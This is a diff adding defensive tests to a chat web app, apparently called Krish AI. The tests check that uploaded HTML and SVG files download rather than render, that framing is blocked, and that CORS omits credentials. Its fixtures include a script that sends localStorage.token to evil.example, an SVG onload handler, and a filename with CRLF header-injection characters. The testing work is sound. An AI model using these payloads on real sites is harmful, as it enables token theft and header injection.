@@ -214,3 +214,32 @@ def test_any_file_type_is_accepted(client):
     system = call["messages"][0]["content"]
     assert "Chocolate cake 450" in system and "x()" not in system
     assert "hello from zip" in system and "program.exe: attached, but no readable text" in system
+
+
+def test_uploaded_web_pages_download_instead_of_running(client):
+    """A booby-trapped .html or .svg upload can't run as Krish AI (and read the sign-in): it downloads."""
+    cid = _conv(client)
+    page = b"<html><script>fetch('https://evil.example/?t='+localStorage.token)</script></html>"
+    f = client.post(f"/api/conversations/{cid}/files", files={"file": ('a"b\r\n.html', page, "text/html")}).json()
+    r = client.get(f"/api/files/{f['id']}/download")
+    assert r.status_code == 200 and r.content == page
+    assert r.headers["content-disposition"].startswith("attachment;")
+    assert "\r" not in r.headers["content-disposition"] and r.headers["content-disposition"].count('"') == 2
+    assert r.headers["content-security-policy"].startswith("sandbox")
+    assert r.headers["x-content-type-options"] == "nosniff"
+    svg = client.post(f"/api/conversations/{cid}/files",
+                      files={"file": ("logo.svg", b"<svg onload='x()'/>", "image/svg+xml; charset=utf-8")}).json()
+    assert client.get(f"/api/files/{svg['id']}/download").headers["content-disposition"].startswith("attachment;")
+    # Pictures and plain text still open in the browser.
+    png = client.post(f"/api/conversations/{cid}/files", files={"file": ("p.png", _text_image("hi"), "image/png")}).json()
+    assert "content-disposition" not in client.get(f"/api/files/{png['id']}/download").headers
+
+
+def test_app_pages_cant_be_framed_by_other_sites(client):
+    r = client.get("/")
+    assert r.headers.get("x-frame-options") == "SAMEORIGIN"
+    assert client.get("/api/").headers.get("x-frame-options") is None
+    # Any site may call the API, but never with the visitor's cookies.
+    pre = client.options("/api/auth/login", headers={"Origin": "https://evil.example",
+                                                     "Access-Control-Request-Method": "POST"})
+    assert pre.headers.get("access-control-allow-credentials") is None
